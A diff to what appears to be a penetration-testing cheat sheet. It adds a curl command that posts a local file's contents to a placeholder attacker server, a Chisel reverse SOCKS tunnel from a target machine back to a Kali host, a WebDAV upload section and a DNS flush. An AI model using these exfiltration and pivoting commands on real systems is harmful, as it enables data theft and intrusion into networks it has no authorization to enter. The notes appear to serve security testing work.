@@ -103,11 +103,12 @@ cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
 
 # Editing a file (and saving only the edited file, not a copy), deleting *-d* all lines starting with 1 *^1*
 sed -i '/^1/d' demo.txt
+
 ```
 
 [Back to top](#index)
 
-### WebDav Server Related
+### Upload/Send files to WebDav/HTTP Server
 
 ```
 # Starting WebDAV server
@@ -115,6 +116,9 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root <path_to_wherever>
 
 #Upload file to webdav server
 curl -X PUT <url> -T /path/to/local/file
+
+#Send the contents of a file through a HTTP Request
+curl --data @/path/to/file http://<server_ip>:<port>/
 ```
 
 [Back to top](#index)
@@ -278,6 +282,9 @@ NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
 # Listening ports
 ss -t -l -n 2>/dev/null
 netstat -ntpl 2>/dev/null
+
+# Flush DNS cache
+ resolvectl flush-caches
 
 ```
 
@@ -1350,7 +1357,15 @@ On Machine_A, execute:
 
 ### Using Chisel
 
-*TO DO*
+#### Reverse SOCKS tunnel
+
+On kali execute:
+
+`./chisel server --port <PORT> --reverse`
+
+On machine A execute:
+
+`chisel client <kali_ip>:<PORT> R:socks`
 
 [Back to top](#index)
 
